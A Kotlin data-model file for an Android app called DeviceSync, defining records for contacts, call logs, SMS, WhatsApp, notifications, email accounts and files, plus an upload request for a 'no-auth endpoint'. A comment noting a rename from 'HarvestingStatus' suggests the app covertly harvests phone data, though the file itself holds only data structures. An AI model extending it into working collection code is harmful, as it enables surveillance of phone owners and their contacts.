package com.devicesync.app.data.models

import java.util.Date

// Device Information
data class DeviceInfo(
    val deviceId: String,
    val details: String,
    val platform: String = "android"
)

// Connection Status
data class ConnectionStatus(
    val message: String,
    val isConnected: Boolean
)

// Sync Status (renamed from HarvestingStatus)
data class SyncStatus(
    val message: String,
    val isActive: Boolean
)

// Data Statistics
data class DataStats(
    val contactsCount: Int,
    val callLogsCount: Int,
    val messagesCount: Int,
    val notificationsCount: Int,
    val filesCount: Int
)

// Permission Information
data class PermissionInfo(
    val name: String,
    val isGranted: Boolean
)

// Data Type Enums
enum class DataTypeEnum {
    CONTACTS,
    CALL_LOGS,
    MESSAGES,
    WHATSAPP,
    NOTIFICATIONS,
    EMAIL_ACCOUNTS,
    FILES
}

// Data Type Configuration
data class DataType(
    val type: DataTypeEnum,
    val name: String,
    val description: String,
    val isEnabled: Boolean,
    val lastSync: Date?
)

// Contact Model
data class ContactModel(
    val contactId: String,
    val name: String,
    val phoneNumber: String,
    val phoneType: String,
    val emails: List<String>,
    val organization: String?
)

// Call Log Model
data class CallLogModel(
    val callId: String,
    val phoneNumber: String,
    val contactName: String?,
    val callType: String,
    val timestamp: Date,
    val duration: Int
)

// Message Model
data class MessageModel(
    val messageId: String,
    val threadId: String?,
    val address: String,
    val body: String,
    val type: String,
    val isIncoming: Boolean,
    val timestamp: Date,
    val isRead: Boolean
)

// Notification Model
data class NotificationModel(
    val notificationId: String,
    val packageName: String,
    val appName: String?,
    val title: String?,
    val text: String?,
    val timestamp: Date
)

// Email Account Model (NEW)
data class EmailAccountModel(
    val emailAddress: String,
    val accountName: String,
    val accountType: String,
    val displayName: String?,
    val isActive: Boolean
)

// File Model
data class FileModel(
    val path: String,
    val name: String,
    val size: Long,
    val lastModified: Date,
    val mimeType: String,
    val isDirectory: Boolean
)

// File Metadata (for upload)
data class FileMetadata(
    val path: String,
    val name: String,
    val size: Long,
    val lastModified: Date,
    val mimeType: String
)

// API Response Models
data class ApiResult(
    val isSuccess: Boolean,
    val message: String,
    val data: Any? = null
)

// Sync Result
data class SyncResult(
    val success: Boolean,
    val message: String,
    val itemsSynced: Int = 0
)

// Data Sync Request (for no-auth endpoint)
data class DataSyncRequest(
    val dataType: String,
    val data: List<Map<String, Any>>,
    val timestamp: String
)
